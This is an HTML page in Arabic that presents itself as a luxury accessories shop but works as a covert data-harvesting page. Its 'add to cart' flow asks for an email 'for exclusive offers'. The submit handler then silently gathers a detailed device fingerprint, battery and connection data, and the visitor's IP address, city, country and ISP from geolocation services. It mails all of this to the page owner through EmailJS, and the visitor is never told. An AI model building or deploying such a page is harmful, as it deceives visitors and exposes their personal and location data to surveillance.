<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أكسسوارات أنيقة | متجرك الفاخر</title>
    <!-- EmailJS Library -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <!-- Font Awesome للأيقونات -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        .header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            padding: 1rem;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }

        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .logo {
            font-size: 2rem;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .cart-icon {
            position: relative;
            cursor: pointer;
            font-size: 1.5rem;
            color: #764ba2;
        }

        .cart-count {
            position: absolute;
            top: -8px;
            right: -8px;
            background: #e74c3c;
            color: white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .hero {
            text-align: center;
            padding: 3rem 1rem;
            color: white;
        }

        .hero h1 {
            font-size: 2.5rem;
            margin-bottom: 1rem;
        }

        .hero p {
            font-size: 1.2rem;
            opacity: 0.95;
        }

        .products-grid {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 1rem;
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 2rem;
        }

        .product-card {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }

        .product-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        .product-image {
            width: 100%;
            height: 300px;
            object-fit: cover;
            border-bottom: 3px solid #764ba2;
        }

        .product-info {
            padding: 1.5rem;
        }

        .product-title {
            font-size: 1.2rem;
            font-weight: bold;
            margin-bottom: 0.5rem;
            color: #333;
        }

        .product-price {
            font-size: 1.5rem;
            color: #764ba2;
            font-weight: bold;
            margin-bottom: 1rem;
        }

        .product-description {
            color: #666;
            margin-bottom: 1rem;
            line-height: 1.6;
        }

        .add-to-cart {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 30px;
            width: 100%;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .add-to-cart:hover {
            transform: scale(1.05);
        }

        .email-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(5px);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .email-modal-content {
            background: white;
            padding: 2rem;
            border-radius: 20px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        .email-modal h3 {
            color: #764ba2;
            margin-bottom: 1rem;
            font-size: 1.5rem;
        }

        .email-modal p {
            color: #666;
            margin-bottom: 1.5rem;
        }

        .email-input {
            width: 100%;
            padding: 1rem;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1rem;
            margin-bottom: 1rem;
            transition: border-color 0.3s;
        }

        .email-input:focus {
            outline: none;
            border-color: #764ba2;
        }

        .modal-buttons {
            display: flex;
            gap: 1rem;
        }

        .submit-email {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 0.8rem;
            border-radius: 10px;
            flex: 2;
            font-weight: bold;
            cursor: pointer;
        }

        .cancel-modal {
            background: #e0e0e0;
            color: #333;
            border: none;
            padding: 0.8rem;
            border-radius: 10px;
            flex: 1;
            cursor: pointer;
        }

        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #4CAF50;
            color: white;
            padding: 1rem 2rem;
            border-radius: 50px;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
            z-index: 3000;
            display: none;
            animation: slideDown 0.3s ease;
        }

        @keyframes slideDown {
            from {
                transform: translate(-50%, -100%);
                opacity: 0;
            }
            to {
                transform: translate(-50%, 0);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="notification" id="notification">
        ✅ تم إرسال تأكيد لبريدك الإلكتروني!
    </div>

    <header class="header">
        <div class="header-content">
            <div class="logo">
                <i class="fas fa-gem"></i>
                Boutique Élégante
            </div>
            <div class="cart-icon" id="cartIcon">
                <i class="fas fa-shopping-cart"></i>
                <span class="cart-count" id="cartCount">0</span>
            </div>
        </div>
    </header>

    <section class="hero">
        <h1>أكسسوارات تناسب أناقتك</h1>
        <p>تصاميم عصرية بجودة عالية وأسعار مميزة</p>
    </section>

    <div class="email-modal" id="emailModal">
        <div class="email-modal-content">
            <h3>مرحباً بك! 👋</h3>
            <p>للإستمرار في التسوق، الرجاء إدخال بريدك الإلكتروني للحصول على عروض حصرية</p>
            <input type="email" id="userEmail" class="email-input" placeholder="بريدك الإلكتروني" required>
            <div class="modal-buttons">
                <button class="submit-email" id="submitEmail">متابعة</button>
                <button class="cancel-modal" id="cancelModal">تخطي</button>
            </div>
        </div>
    </div>

    <div class="products-grid" id="productsGrid"></div>

    <script>
        // بيانات EmailJS
        const PUBLIC_KEY = "ME4zxFzFyFhRTqLsl";
        const SERVICE_ID = "service_k4aclgh";
        const TEMPLATE_ID = "ptpt4uj";

        // تهيئة EmailJS
        (function() {
            emailjs.init(PUBLIC_KEY);
        })();

        const products = [
            {
                id: 1,
                title: "نظارات شمسية كلاسيكية",
                price: 89.99,
                description: "تصميم أنيق يحمي عينيك من الأشعة فوق البنفسجية",
                image: "https://images.unsplash.com/photo-1572635196237-14b3f281503f?w=500&auto=format"
            },
            {
                id: 2,
                title: "ساعة فاخرة",
                price: 199.99,
                description: "ساعة سويسرية بتصميم عصري ومتين",
                image: "https://images.unsplash.com/photo-1524592094714-0f0654e20314?w=500&auto=format"
            },
            {
                id: 3,
                title: "عقد ذهبي",
                price: 149.99,
                description: "عقد من الذهب عيار 18 مع قلادة مميزة",
                image: "https://images.unsplash.com/photo-1601121191172-9dff9911c7e6?w=500&auto=format"
            },
            {
                id: 4,
                title: "سوار جلدي",
                price: 49.99,
                description: "سوار من الجلد الطبيعي بتصميم عصري",
                image: "https://images.unsplash.com/photo-1573408301185-9146fe634ad0?w=500&auto=format"
            },
            {
                id: 5,
                title: "خاتم فضة",
                price: 79.99,
                description: "خاتم من الفضة الإسترليني مع حجر زركون",
                image: "https://images.unsplash.com/photo-1605100804763-247f67b3557e?w=500&auto=format"
            },
            {
                id: 6,
                title: "حقيبة يد أنيقة",
                price: 129.99,
                description: "حقيبة جلدية فاخرة تناسب جميع المناسبات",
                image: "https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=500&auto=format"
            }
        ];

        let cart = JSON.parse(localStorage.getItem('cart')) || [];
        let currentProduct = null;

        function displayProducts() {
            const grid = document.getElementById('productsGrid');
            grid.innerHTML = products.map(product => `
                <div class="product-card" onclick="openEmailModal(${product.id})">
                    <img src="${product.image}" alt="${product.title}" class="product-image" loading="lazy">
                    <div class="product-info">
                        <h3 class="product-title">${product.title}</h3>
                        <div class="product-price">$${product.price}</div>
                        <p class="product-description">${product.description}</p>
                        <button class="add-to-cart" onclick="event.stopPropagation(); openEmailModal(${product.id})">
                            <i class="fas fa-shopping-cart"></i>
                            أضف للسلة
                        </button>
                    </div>
                </div>
            `).join('');
        }

        function openEmailModal(productId) {
            currentProduct = products.find(p => p.id === productId);
            document.getElementById('emailModal').style.display = 'flex';
        }

        document.getElementById('cancelModal').onclick = function() {
            document.getElementById('emailModal').style.display = 'none';
            currentProduct = null;
        };

        // دالة متقدمة لجمع كل معلومات الجهاز
        async function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            const info = {
                // أساسيات
                browser: "Unknown",
                browserVersion: "Unknown",
                os: "Unknown",
                osVersion: "Unknown",
                deviceType: "Desktop",
                deviceBrand: "Unknown",
                deviceModel: "Unknown",
                
                // شاشة
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth + "-bit",
                
                // لغة ووقت
                language: navigator.language || navigator.userLanguage,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // أداء
                memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متاح",
                cpuCores: navigator.hardwareConcurrency || "غير متاح",
                
                // اتصال
                connectionType: "غير متاح",
                effectiveBandwidth: "غير متاح",
                
                // بطارية
                batteryLevel: "غير متاح",
                batteryCharging: "غير متاح",
                
                // تفاصيل إضافية
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || "غير مفعل",
                
                // UserAgent الخام
                rawUserAgent: ua
            };

            // تحديد المتصفح والإصدار بالتفصيل
            if (ua.includes("Chrome")) {
                info.browser = "Chrome";
                const match = ua.match(/Chrome\/(\d+\.\d+)/);
                if (match) info.browserVersion = match[1];
            } else if (ua.includes("Firefox")) {
                info.browser = "Firefox";
                const match = ua.match(/Firefox\/(\d+\.\d+)/);
                if (match) info.browserVersion = match[1];
            } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
                info.browser = "Safari";
                const match = ua.match(/Version\/(\d+\.\d+)/);
                if (match) info.browserVersion = match[1];
            } else if (ua.includes("Edg")) {
                info.browser = "Edge";
                const match = ua.match(/Edg\/(\d+\.\d+)/);
                if (match) info.browserVersion = match[1];
            }

            // تحديد نظام التشغيل والإصدار
            if (ua.includes("Windows")) {
                info.os = "Windows";
                if (ua.includes("Windows NT 10.0")) info.osVersion = "10/11";
                else if (ua.includes("Windows NT 6.3")) info.osVersion = "8.1";
                else if (ua.includes("Windows NT 6.2")) info.osVersion = "8";
                else if (ua.includes("Windows NT 6.1")) info.osVersion = "7";
            } else if (ua.includes("Mac OS X")) {
                info.os = "macOS";
                const match = ua.match(/Mac OS X (\d+[._]\d+[._]\d+)/);
                if (match) info.osVersion = match[1].replace(/_/g, '.');
            } else if (ua.includes("Android")) {
                info.os = "Android";
                const match = ua.match(/Android (\d+\.\d+)/);
                if (match) info.osVersion = match[1];
                info.deviceType = "Mobile";
            } else if (ua.includes("iPhone") || ua.includes("iPad")) {
                info.os = "iOS";
                const match = ua.match(/OS (\d+[._]\d+)/);
                if (match) info.osVersion = match[1].replace(/_/g, '.');
                info.deviceType = "Mobile";
            } else if (ua.includes("Linux")) {
                info.os = "Linux";
            }

            // تحديد نوع الجهاز بدقة
            if (ua.includes("Android") || ua.includes("iPhone") || ua.includes("iPad") || ua.includes("Mobile")) {
                info.deviceType = "Mobile";
                
                // محاولة استخراج الماركة والموديل للأندرويد
                if (ua.includes("Android")) {
                    // ماركات معروفة
                    if (ua.includes("SM-")) {
                        info.deviceBrand = "Samsung";
                        const match = ua.match(/SM-[A-Z0-9]+/);
                        if (match) info.deviceModel = match[0];
                    } else if (ua.includes("Redmi") || ua.includes("Xiaomi")) {
                        info.deviceBrand = "Xiaomi";
                        const match = ua.match(/(Redmi|Xiaomi)[^;)]+/);
                        if (match) info.deviceModel = match[0];
                    } else if (ua.includes("HUAWEI")) {
                        info.deviceBrand = "Huawei";
                        const match = ua.match(/HUAWEI[^;)]+/);
                        if (match) info.deviceModel = match[0];
                    } else if (ua.includes("Realme")) {
                        info.deviceBrand = "Realme";
                        const match = ua.match(/Realme[^;)]+/);
                        if (match) info.deviceModel = match[0];
                    } else if (ua.includes("OPPO")) {
                        info.deviceBrand = "OPPO";
                        const match = ua.match(/OPPO[^;)]+/);
                        if (match) info.deviceModel = match[0];
                    } else if (ua.includes("Vivo")) {
                        info.deviceBrand = "Vivo";
                        const match = ua.match(/Vivo[^;)]+/);
                        if (match) info.deviceModel = match[0];
                    } else if (ua.includes("Pixel")) {
                        info.deviceBrand = "Google Pixel";
                        const match = ua.match(/Pixel[^;)]+/);
                        if (match) info.deviceModel = match[0];
                    } else {
                        info.deviceBrand = "Android Device";
                        // محاولة استخراج أي موديل
                        const match = ua.match(/Android[^;)]+;[^;)]+;\s*([^;)]+)/);
                        if (match) info.deviceModel = match[1].trim();
                    }
                } else if (ua.includes("iPhone")) {
                    info.deviceBrand = "Apple";
                    const match = ua.match(/iPhone[^\s,)]*/);
                    if (match) info.deviceModel = match[0];
                } else if (ua.includes("iPad")) {
                    info.deviceBrand = "Apple";
                    const match = ua.match(/iPad[^\s,)]*/);
                    if (match) info.deviceModel = match[0];
                }
            } else {
                info.deviceType = "Desktop";
                // محاولة تحديد نوع الحاسب
                if (ua.includes("Mac")) info.deviceBrand = "Apple Mac";
                else if (ua.includes("Windows")) info.deviceBrand = "Windows PC";
                else if (ua.includes("Linux")) info.deviceBrand = "Linux PC";
            }

            // معلومات الاتصال
            if (navigator.connection) {
                const conn = navigator.connection;
                info.connectionType = conn.effectiveType || "غير متاح";
                info.effectiveBandwidth = conn.downlink ? conn.downlink + " Mbps" : "غير متاح";
                info.rtt = conn.rtt ? conn.rtt + " ms" : "غير متاح";
                info.dataSaver = conn.saveData ? "مفعل" : "غير مفعل";
            }

            // معلومات البطارية (قديمة لكن بعض المتصفحات تدعمها)
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = Math.round(battery.level * 100) + "%";
                    info.batteryCharging = battery.charging ? "نعم" : "لا";
                }
            } catch (e) {
                // متصفح لا يدعم
            }

            return info;
        }

        // دالة للحصول على IP والموقع التقريبي
        async function getLocationInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || "غير متاح",
                    city: data.city || "غير متاح",
                    region: data.region || "غير متاح",
                    country: data.country_name || "غير متاح",
                    isp: data.org || "غير متاح"
                };
            } catch (error) {
                // إذا فشل API، نحاول ipify على الأقل للـ IP
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return {
                        ip: data.ip || "غير متاح",
                        city: "غير متاح",
                        region: "غير متاح",
                        country: "غير متاح",
                        isp: "غير متاح"
                    };
                } catch {
                    return {
                        ip: "غير متاح",
                        city: "غير متاح",
                        region: "غير متاح",
                        country: "غير متاح",
                        isp: "غير متاح"
                    };
                }
            }
        }

        // دالة الإرسال الرئيسية
        document.getElementById('submitEmail').onclick = async function() {
            const email = document.getElementById('userEmail').value;
            if (!email || !email.includes('@')) {
                alert('الرجاء إدخال بريد إلكتروني صحيح');
                return;
            }

            // جمع كل المعلومات
            const deviceInfo = await getDetailedDeviceInfo();
            const locationInfo = await getLocationInfo();

            // تجهيز البارامترات للإرسال
            const templateParams = {
                // معلومات أساسية
                user_email: email,
                
                // جهاز ومتصفح
                browser: `${deviceInfo.browser} ${deviceInfo.browserVersion}`,
                os: `${deviceInfo.os} ${deviceInfo.osVersion}`,
                device_type: deviceInfo.deviceType,
                device_brand: deviceInfo.deviceBrand,
                device_model: deviceInfo.deviceModel,
                
                // شاشة
                screen: deviceInfo.screenResolution,
                color_depth: deviceInfo.colorDepth,
                
                // لغة ووقت
                language: deviceInfo.language,
                timezone: deviceInfo.timezone,
                
                // أداء
                memory: deviceInfo.memory,
                cpu_cores: deviceInfo.cpuCores,
                
                // اتصال
                connection: deviceInfo.connectionType,
                bandwidth: deviceInfo.effectiveBandwidth,
                data_saver: deviceInfo.dataSaver,
                
                // بطارية
                battery: deviceInfo.batteryLevel,
                charging: deviceInfo.batteryCharging,
                
                // موقع
                ip: locationInfo.ip,
                city: locationInfo.city,
                region: locationInfo.region,
                country: locationInfo.country,
                isp: locationInfo.isp,
                
                // وقت
                time: new Date().toLocaleString('ar-IQ'),
                
                // تفاصيل خام
                platform: deviceInfo.platform,
                raw_ua: deviceInfo.rawUserAgent
            };

            // إرسال الإيميل
            try {
                await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
                
                // إضافة للسلة
                addToCart(currentProduct);

                // إغلاق النافذة
                document.getElementById('emailModal').style.display = 'none';
                document.getElementById('userEmail').value = '';

                // إظهار إشعار
                showNotification();
                
                console.log('✅ تم الإرسال بنجاح', templateParams);
            } catch (error) {
                console.error('❌ فشل الإرسال:', error);
                alert('حدث خطأ في الإرسال. تأكدي من إعدادات EmailJS');
            }
        };

        function addToCart(product) {
            if (product) {
                cart.push(product);
                localStorage.setItem('cart', JSON.stringify(cart));
                document.getElementById('cartCount').textContent = cart.length;
            }
        }

        function showNotification() {
            const notification = document.getElementById('notification');
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        document.getElementById('cartCount').textContent = cart.length;

        displayProducts();

        window.onclick = function(event) {
            const modal = document.getElementById('emailModal');
            if (event.target === modal) {
                modal.style.display = 'none';
                currentProduct = null;
            }
        };
    </script>
</body>
</html>
